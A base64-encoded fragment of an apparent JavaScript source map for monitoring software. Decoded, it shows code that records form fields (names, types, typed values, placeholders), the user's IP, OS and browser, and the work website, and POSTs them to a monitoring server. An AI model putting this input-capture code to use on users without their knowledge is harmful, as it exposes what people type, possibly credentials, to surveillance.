CAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVJbnB1dEVsZW1lbnREYXRhJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0LnNlbmRSZXF1ZXN0KHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiBcIlBPU1RcIixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiSW5wdXRFbGVtZW50RGF0YVJlY29yZFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyOiBbe25hbWU6IFwiQ29udGVudC10eXBlXCIsIHZhbHVlOiBcImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOFwifV0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY29tbWFuZFwiOiByZXF1ZXN0LmNvbW1hbmQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlucHV0RWxlbWVudERhdGFcIjoge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZWZhdWx0Xzoge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInRyYWNrZXJcIjogVHJhY2tlci5pZGVudGl0eSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJhcHBfaWRcIjogVHJhY2tlci52ZXJzaW9uLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlwXCI6IHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIm9zX25hbWVfYXJjaFwiOiBUcmFja2VyLm9zTmFtZUFuZEFyY2gsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYnJvd3NlclwiOiBUcmFja2VyLmJyb3dzZXJOYW1lRnVsbFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiByZXF1ZXN0LmRhdGEubmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndHlwZSc6IHJlcXVlc3QuZGF0YS50eXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IHJlcXVlc3QuZGF0YS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncGxhY2Vob2xkZXInOiByZXF1ZXN0LmRhdGEucGxhY2Vob2xkZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiByZXF1ZXN0LmRhdGEud29ya1dlYnNpdGVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9KTtcblxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0sMTAwKTtcbiAgICAgICAgfVxuICAgIH1cbn1cbiJdLCJuYW1lcyI6W10sInNvdXJjZVJvb3QiOiIifQ==